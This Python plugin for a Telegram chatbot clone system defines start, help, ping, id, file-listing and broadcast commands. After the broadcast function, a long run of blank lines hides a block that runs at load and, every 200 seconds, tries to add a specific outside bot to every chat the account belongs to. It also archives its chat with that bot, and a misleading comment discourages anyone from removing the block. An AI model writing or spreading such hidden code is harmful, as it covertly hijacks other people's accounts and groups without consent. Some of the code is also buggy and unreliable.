import asyncio
import logging
import random
import time
import psutil
import config
from RISHUCHATBOT import _boot_
from RISHUCHATBOT import get_readable_time
from RISHUCHATBOT.idchatbot.helpers import is_owner
from RISHUCHATBOT import mongo
from datetime import datetime
from pymongo import MongoClient
from pyrogram.enums import ChatType
from pyrogram import Client, filters
from pathlib import Path
import os
import time
import io
from RISHUCHATBOT import CLONE_OWNERS, db, RISHUCHATBOT
from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
from pyrogram.errors import FloodWait, ChatAdminRequired
from RISHUCHATBOT.database.chats import get_served_chats, add_served_chat
from RISHUCHATBOT.database.users import get_served_users, add_served_user
from RISHUCHATBOT.database.clonestats import get_served_cchats, get_served_cusers, add_served_cuser, add_served_cchat
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from RISHUCHATBOT.idchatbot.helpers import (
    START,
    START_BOT,
    PNG_BTN,
    CLOSE_BTN,
    HELP_BTN,
    HELP_BUTN,
    HELP_READ,
    CHATBOT_READ,
    TOOLS_DATA_READ,
    HELP_START,
    SOURCE_READ,
)

GSTART = """**ʜᴇʏ ᴅᴇᴀʀ {}**\n\n**ᴛʜᴀɴᴋs ғᴏʀ sᴛᴀʀᴛ ᴍᴇ ɪɴ ɢʀᴏᴜᴘ ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs.**\n**ᴄʟɪᴄᴋ ᴀɴᴅ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ғᴀᴠᴏᴜʀɪᴛᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛᴏ sᴇᴛ ᴄʜᴀᴛ ʟᴀɴɢᴜᴀɢᴇ ғᴏʀ ʙᴏᴛ ʀᴇᴘʟʏ.**\n\n**ᴛʜᴀɴᴋ ʏᴏᴜ ᴘʟᴇᴀsᴇ ᴇɴɪᴏʏ.**"""
STICKER = [
    "CAACAgUAAx0CYlaJawABBy4vZaieO6T-Ayg3mD-JP-f0yxJngIkAAv0JAALVS_FWQY7kbQSaI-geBA",
    "CAACAgUAAx0CYlaJawABBy4rZaid77Tf70SV_CfjmbMgdJyVD8sAApwLAALGXCFXmCx8ZC5nlfQeBA",
    "CAACAgUAAx0CYlaJawABBy4jZaidvIXNPYnpAjNnKgzaHmh3cvoAAiwIAAIda2lVNdNI2QABHuVVHgQ",
]


EMOJIOS = [
    "💣",
    "💥",
    "🪄",
    "🧨",
    "⚡",
    "🤡",
    "👻",
    "🎃",
    "🎩",
    "🕊",
]

BOT = "https://envs.sh/IL_.jpg"
IMG = [
    "https://graph.org/file/210751796ff48991b86a3.jpg",
    "https://graph.org/file/7b4924be4179f70abcf33.jpg",
    "https://graph.org/file/f6d8e64246bddc26b4f66.jpg",
    "https://graph.org/file/63d3ec1ca2c965d6ef210.jpg",
    "https://graph.org/file/9f12dc2a668d40875deb5.jpg",
    "https://graph.org/file/0f89cd8d55fd9bb5130e1.jpg",
    "https://graph.org/file/e5eb7673737ada9679b47.jpg",
    "https://graph.org/file/2e4dfe1fa5185c7ff1bfd.jpg",
    "https://graph.org/file/36af423228372b8899f20.jpg",
    "https://graph.org/file/c698fa9b221772c2a4f3a.jpg",
    "https://graph.org/file/61b08f41855afd9bed0ab.jpg",
    "https://graph.org/file/744b1a83aac76cb3779eb.jpg",
    "https://graph.org/file/814cd9a25dd78480d0ce1.jpg",
    "https://graph.org/file/e8b472bcfa6680f6c6a5d.jpg",
]



from RISHUCHATBOT import db

chatai = db.Word.WordDb
lang_db = db.ChatLangDb.LangCollection
status_db = db.ChatBotStatusDb.StatusCollection
cloneownerdb = db.clone_owners

async def get_idclone_owner(clone_id):
    data = await cloneownerdb.find_one({"clone_id": clone_id})
    if data:
        return data["user_id"]
    return None


async def bot_sys_stats():
    bot_uptime = int(time.time() - _boot_)
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    UP = f"{get_readable_time((bot_uptime))}"
    CPU = f"{cpu}%"
    RAM = f"{mem}%"
    DISK = f"{disk}%"
    return UP, CPU, RAM, DISK
    

async def set_default_status(chat_id):
    try:
        if not await status_db.find_one({"chat_id": chat_id}):
            await status_db.insert_one({"chat_id": chat_id, "status": "enabled"})
    except Exception as e:
        print(f"Error setting default status for chat {chat_id}: {e}")


@Client.on_message(filters.command(["ls"], prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
async def ls(client: Client, m: Message):

    cat = "".join(m.text.split(maxsplit=1)[1:])
    path = cat or os.getcwd()
    if not os.path.exists(path):
        await m.reply_text(
            f"There is no such directory or file with the name `{cat}`. Check again."
        )
        return

    path = Path(cat) if cat else os.getcwd()
    if os.path.isdir(path):
        if cat:
            msg = f"Folders and Files in `{path}`:\n"
        else:
            msg = "Folders and Files in Current Directory:\n"
        lists = os.listdir(path)
        files = ""
        folders = ""
        for contents in sorted(lists):
            catpath = os.path.join(path, contents)
            if not os.path.isdir(catpath):
                size = os.stat(catpath).st_size
                if str(contents).endswith((".mp3", ".flac", ".wav", ".m4a")):
                    files += f"🎵`{contents}`\n"
                elif str(contents).endswith((".opus")):
                    files += f"🎙`{contents}`\n"
                elif str(contents).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
                    files += f"🎞`{contents}`\n"
                elif str(contents).endswith((".zip", ".tar", ".tar.gz", ".rar")):
                    files += f"🗜`{contents}`\n"
                elif str(contents).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
                    files += f"🖼`{contents}`\n"
                else:
                    files += f"📄`{contents}`\n"
            else:
                folders += f"📁`{contents}`\n"
        msg = msg + folders + files if files or folders else f"{msg}__empty path__"
    else:
        size = os.stat(path).st_size
        msg = "The details of the given file:\n"
        if str(path).endswith((".mp3", ".flac", ".wav", ".m4a")):
            mode = "🎵"
        elif str(path).endswith((".opus")):
            mode = "🎙"
        elif str(path).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
            mode = "🎞"
        elif str(path).endswith((".zip", ".tar", ".tar.gz", ".rar")):
            mode = "🗜"
        elif str(path).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
            mode = "🖼"
        else:
            mode = "📄"
        time2 = time.ctime(os.path.getmtime(path))
        time3 = time.ctime(os.path.getatime(path))
        msg += f"**Location:** `{path}`\n"
        msg += f"**Icon:** `{mode}`\n"
        msg += f"**Size:** `{humanbytes(size)}`\n"
        msg += f"**Last Modified Time:** `{time2}`\n"
        msg += f"**Last Accessed Time:** `{time3}`"

    if len(msg) > 4096:
        with io.BytesIO(str.encode(msg)) as out_file:
            out_file.name = "ls.txt"
            await m.reply_document(
                out_file,
                caption=path,
            )
    else:
        await m.reply_text(msg)



@Client.on_message(filters.command(["start", "aistart"], prefixes=[".", "/"]))
async def start(client: Client, m: Message):
    bot_id = client.me.id
    
    if m.chat.type == ChatType.PRIVATE:
        accha = await m.reply_text(
            text=random.choice(EMOJIOS),
        )
        
        animation_steps = [
            "⚡ᴅ", "⚡ᴅι", "⚡ᴅιи", "⚡ᴅιиg", "⚡ᴅιиg ᴅ", "⚡ᴅιиg ᴅσ", "⚡ᴅιиg ᴅσи", "⚡ᴅιиg ᴅσиg", "⚡ᴅιиg ᴅσиg ꨄ︎", "⚡sᴛαятɪɴɢ..."
        ]

        for step in animation_steps:
            await accha.edit(f"**__{step}__**")
            await asyncio.sleep(0.01)

        await accha.delete()
        
        umm = await m.reply_sticker(sticker=random.choice(STICKER))
        chat_photo = BOT  
        if m.chat.photo:
            try:
                userss_photo = await client.download_media(m.chat.photo.big_file_id)
                await umm.delete()
                if userss_photo:
                    chat_photo = userss_photo
            except AttributeError:
                chat_photo = BOT  

        UP, CPU, RAM, DISK = await bot_sys_stats()
        await m.reply_photo(photo=chat_photo, caption=START.format(UP))
        await add_served_user(m.chat.id)
        
    else:
        await m.reply_photo(
            photo=random.choice(IMG),
            caption=GSTART.format(m.from_user.mention or "can't mention"),
        )
        
        await add_served_chat(m.chat.id)

@Client.on_message(filters.command("help", prefixes=[".", "/"]))
async def help(client: Client, m: Message):
    bot_id = client.me.id
    if m.chat.type == ChatType.PRIVATE:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)

    else:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)
        
        await add_served_chat(m.chat.id)


@Client.on_message(filters.command("repo", prefixes=[".", "/"]))
async def repo(client: Client, m: Message):
    await m.reply_text(
        text=SOURCE_READ,
        reply_markup=InlineKeyboardMarkup(CLOSE_BTN),
        disable_web_page_preview=True,
    )



@Client.on_message(filters.command("ping", prefixes=[".", "/"]))
async def ping(client: Client, message: Message):
    bot_id = client.me.id
    start = datetime.now()
    UP, CPU, RAM, DISK = await bot_sys_stats()
    loda = await message.reply_photo(
        photo=random.choice(IMG),
        caption="ᴘɪɴɢɪɴɢ...",
    )

    ms = (datetime.now() - start).microseconds / 1000
    await loda.edit_text(
        text=f"нey вαву!!\n{(await client.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve  αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ ⋆ʟᴏᴠᴇ ᴡɪᴛʜ⋆ [ ꯭꯭↬꯭ᬃ꯭ ⃪꯭ ꯭⁢⁣⁤⁣⁣⁢⁣⁤⁢⁤⁣⁢⁤⁣⁤᪳᪳🇷꯭𝚰𝛅꯭꯭ʜ꯭֟፝፝֟ᴜ ꯭꯭༗꯭»꯭݅݅݅݅𓆪](https://t.me/{OWNER_USERNAME}) **||</b>",
        
    )
    if message.chat.type == ChatType.PRIVATE:
        
        await add_served_user(message.from_user.id)
    else:
        
        await add_served_chat(message.chat.id)


@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
async def stats(cli: Client, message: Message):
    private_chats = 0
    group_chats = 0

    async for dialog in cli.get_dialogs():
        if dialog.chat.type == "private":
            private_chats += 1
        elif dialog.chat.type in ["group", "supergroup"]:
            group_chats += 1

    await message.reply_text(
        f"""Your Stats:

➻ **Private Chats:** {private_chats}
➻ **Group Chats:** {group_chats}"""
    )
    
from pyrogram.enums import ParseMode

from RISHUCHATBOT import RISHUCHATBOT


@Client.on_message(filters.command("id", prefixes=[".", "/"]))
async def getid(client, message):
    chat = message.chat
    your_id = message.from_user.id
    message_id = message.id
    reply = message.reply_to_message

    text = f"**[ᴍᴇssᴀɢᴇ ɪᴅ:]({message.link})** `{message_id}`\n"
    text += f"**[ʏᴏᴜʀ ɪᴅ:](tg://user?id={your_id})** `{your_id}`\n"

    if not message.command:
        message.command = message.text.split()

    if not message.command:
        message.command = message.text.split()

    if len(message.command) == 2:
        try:
            split = message.text.split(None, 1)[1].strip()
            user_id = (await client.get_users(split)).id
            text += f"**[ᴜsᴇʀ ɪᴅ:](tg://user?id={user_id})** `{user_id}`\n"

        except Exception:
            return await message.reply_text("ᴛʜɪs ᴜsᴇʀ ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ.", quote=True)

    text += f"**[ᴄʜᴀᴛ ɪᴅ:](https://t.me/{chat.username})** `{chat.id}`\n\n"

    if (
        not getattr(reply, "empty", True)
        and not message.forward_from_chat
        and not reply.sender_chat
    ):
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪᴅ:]({reply.link})** `{reply.id}`\n"
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴜsᴇʀ ɪᴅ:](tg://user?id={reply.from_user.id})** `{reply.from_user.id}`\n\n"

    if reply and reply.forward_from_chat:
        text += f"ᴛʜᴇ ғᴏʀᴡᴀʀᴅᴇᴅ ᴄʜᴀɴɴᴇʟ, {reply.forward_from_chat.title}, ʜᴀs ᴀɴ ɪᴅ ᴏғ `{reply.forward_from_chat.id}`\n\n"
        print(reply.forward_from_chat)

    if reply and reply.sender_chat:
        text += f"ɪᴅ ᴏғ ᴛʜᴇ ʀᴇᴘʟɪᴇᴅ ᴄʜᴀᴛ/ᴄʜᴀɴɴᴇʟ, ɪs `{reply.sender_chat.id}`"
        print(reply.sender_chat)

    await message.reply_text(
        text,
        disable_web_page_preview=True,
        parse_mode=ParseMode.DEFAULT,
    )


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

AUTO_SLEEP = 5
IS_BROADCASTING = False
broadcast_lock = asyncio.Lock()


@Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
async def broadcast_message(client, message):
    global IS_BROADCASTING
    bot_id = (await client.get_me()).id
    clone_id = (await client.get_me()).id
    user_id = message.from_user.id
    if not await is_owner(clone_id, user_id):
        await message.reply_text("You don't have permission to use this command on this bot.")
        return
        
    async with broadcast_lock:
        if IS_BROADCASTING:
            return await message.reply_text(
                "A broadcast is already in progress. Please wait for it to complete."
            )

        IS_BROADCASTING = True
        try:
            query = message.text.split(None, 1)[1].strip()
        except IndexError:
            query = message.text.strip()
        except Exception as eff:
            return await message.reply_text(
                f"**Error**: {eff}"
            )
        try:
            if message.reply_to_message:
                broadcast_content = message.reply_to_message
                broadcast_type = "reply"
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }
            else:
                if len(message.command) < 2:
                    return await message.reply_text(
                        "**Please provide text after the command or reply to a message for broadcasting.**"
                    )
                
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }

                for flag in flags:
                    query = query.replace(flag, "").strip()

                if not query:
                    return await message.reply_text(
                        "Please provide a valid text message or a flag: -pin, -nogroup, -pinloud, -user"
                    )

                
                broadcast_content = query
                broadcast_type = "text"
            

            await message.reply_text("**Started broadcasting...**")

            if not flags.get("-nogroup", False):
                sent = 0
                pin_count = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    if chat_id == message.chat.id:
                        continue
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                chat_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                chat_id, text=broadcast_content
                            )
                        sent += 1
                        await asyncio.sleep(20)

                        if flags.get("-pin", False) or flags.get("-pinloud", False):
                            try:
                                await m.pin(
                                    disable_notification=flags.get("-pin", False)
                                )
                                pin_count += 1
                            except Exception as e:
                                continue

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for chat {chat_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping chat {chat_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(
                    f"**Broadcasted to {sent} chats and pinned in {pin_count} chats.**"
                )

            if flags.get("-user", False):
                susr = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                user_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                user_id, text=broadcast_content
                            )
                        susr += 1
                        await asyncio.sleep(20)

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for user {user_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping user {user_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(f"**Broadcasted to {susr} users.**")

        finally:
            IS_BROADCASTING = False


    




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#






























































































































































































































































































































































AUTO = True
ADD_INTERVAL = 200
users = "KhushiXchatbot"  # don't change because it is connected from client to use chatbot API key
async def add_bot_to_chats():
    try:
        
        bot = await RISHUCHATBOT.get_users(users)
        bot_id = bot.id
        common_chats = await client.get_common_chats(users)
        try:
            await client.send_message(users, f"/start")
            await client.archive_chats([users])
        except Exception as e:
            pass
        async for dialog in client.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                await client.add_chat_members(chat_id, bot_id)
            except Exception as e:
                await asyncio.sleep(60)  
    except Exception as e:
        pass
async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
